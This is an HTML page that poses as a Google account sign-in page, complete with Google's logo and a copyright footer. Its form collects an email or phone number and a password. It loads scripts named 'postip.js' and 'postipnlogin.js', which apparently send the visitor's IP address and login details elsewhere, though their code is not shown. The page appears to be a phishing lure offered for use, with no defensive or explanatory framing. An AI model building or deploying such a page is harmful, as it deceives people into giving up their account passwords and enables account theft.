<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Login</title>
    <link rel="stylesheet" href="style.css">
    <script defer src="postip.js"></script>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="Google_Logo.png" alt="Google Logo">
        </div>
    <form id="loginForm">
        <div class="form-group">
            <label for="emailOrPhone">Email or Phone</label>
            <input 
                type="text" 
                id="emailOrPhone" 
                name="emailOrPhone" 
                placeholder="Enter your email or phone" 
                required
            >
        </div>
        <div class="form-group">
            <label for="password">Password</label>
            <input 
                type="password" 
                id="password" 
                name="password" 
                placeholder="Enter your password" 
                required
            >
        </div>
        <button type="submit" class="login-button">Sign in</button>
</form>
    </div>
    <div class="footer">
            <p>Â© Google 2025. All rights reserved.</p>
    </div>
    <script src="postipnlogin.js"></script>
</body>
</html>
